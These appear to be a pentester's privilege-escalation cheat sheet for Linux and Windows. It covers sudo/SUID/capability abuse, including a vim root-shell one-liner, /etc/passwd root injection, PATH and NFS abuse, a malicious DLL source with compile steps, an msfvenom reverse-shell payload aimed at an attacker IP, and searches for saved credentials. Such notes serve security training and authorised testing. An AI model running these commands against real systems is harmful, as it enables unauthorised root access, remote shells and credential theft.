
	## Privilege escalation
	
	## All operative syste
	https://github.com/carlospolop/PEASS-ng

		------ Linux -----

		# Linux checks for search
		https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

		## Review command that can run as root
			sudo -l

		## sudo Nmap spawn shell
		https://gtfobins.github.io/gtfobins/nmap/
		https://w0lfram1te.com/privilege-escalation-with-nmap

		## sudo Nano spawn shell
		https://gtfobins.github.io/gtfobins/nano/

		## Priv trhow SSID
		# List files that have SUID or SGID bits set.
			> find / -type f -perm -04000 -ls 2>/dev/null
			> Files have an “s” bit set showing their special permission level.
			> Vulnerable files: https://gtfobins.github.io/#+suid

		## Add user to /etc/passwd
		* Create password hash: openssl passwd -1 -salt [somsalt] [passwd]
		* Add de entry in /etc/password and add root:/bin/bash in the end

		## Capabilities
		* Check capabilities: getcap -r /
		* Using vim capavilities to elevate privs
			> ./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' 

		## Cron jobs
		* cat /etc/crontab
		* Use potential misconfiguration to exec reverse root shell

		## PATH
		* If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script
		* echo $PATH
		* Search writeable folders:
			> all: find / -writable 2>/dev/null
			> clean find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
					find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
		* Add /tmp to PATH
			> export PATH=/tmp:$PATH

		## NFS (Network File Sharing)
		* cat /etc/exports
		* Review from remote: showmount -e [IP]
		* The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.
		* Mount remote folder into local, create exploit and exec

		
		------ Windows -----

		## Automatic Tools
			- WinPeas: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
			- PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
				> powershell.exe -nop -exec bypass
				> Import-Module .\PowerUp.ps1
				> Invoke-AllChecks

		## Check Windows Defender in your own machine to no genearate noice
			- Windows Exploit Suggester
				> Old Version: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
				> New Version: https://github.com/bitsadmin/wesng

		## Vulnerable software
			- List Sowftware instaled: wmic
									   wmic product
				> Filter output: wmic product get name,version,vendor
			- Check services: wmic service list brief
				> Filter running services: wmic service list brief | findstr  "Running"
				> Adicional information of specific service: sc qc [service name]

		## Users Types ##
		* Administrator (local): This is the user with the most privileges.
		* Standard (local): These users can access the computer but can only perform limited tasks. Typically these users can not make permanent or essential changes to the system. 
		* Guest: This account gives access to the system but is not defined as a user. 
		* Standard (domain): Active Directory allows organizations to manage user accounts. A standard domain account may have local administrator privileges. 
		* Administrator (domain): Could be considered as the most privileged user. It can edit, create, and delete other users throughout the organization's domain. 

		## Documentation, tecnics and tactics
		https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

		## Information gathering

		## DLL Hijaking
		A DLL Hijacking scenario consists of replacing a legitimate DLL file with a malicious DLL file that will be called by the executable and run.

		Example of Crafted Malicious DLL:

		    ```      
			#include <windows.h>

			BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
			    if (dwReason == DLL_PROCESS_ATTACH) {
			        system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
			        ExitProcess(0);
			    }
			    return TRUE;
			}
			```

		Compilar la DLL desde Linux:

			```
			apt install gcc-mingw-w64-x86-64 
			x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
			```

		Program for search DLL
		- https://docs.microsoft.com/en-us/sysinternals/downloads/procmon


		## Unquoted Service Path
		Things to keep in mind:
			    - Being able to write to a folder on the path
    			- Being able to restart the service

    	Command for search services and unquoted paths
    	- wmic service get name,displayname,pathname,startmode

    	Check specific service
    	- sc qc [service]

    	Check our privileges in a specific folder
    	- .\accesschk64.exe /accepteula -uwdq "C:\Program Files\"

    	Generate malicious binari
    	- msfvenom -p windows/x64/shell_reverse_tcp LHOST=[Ataker IP] LPORT=[Ataker Port] -f exe > executable_name.exe

    	Start the service
    	- sc start [service name]

    	## Other Takticks
    	- Scheduled Tasks
    		* Command: schtasks
    	- AlwaysInstallElevated
    	- Saved credentials
    		* Command: cmdkey /list
    				   runas /savecred /user:admin reverse_shell.exe
    				   reg query HKLM /f password /t REG_SZ /s
					   reg query HKCU /f password /t REG_SZ /s













        
		




		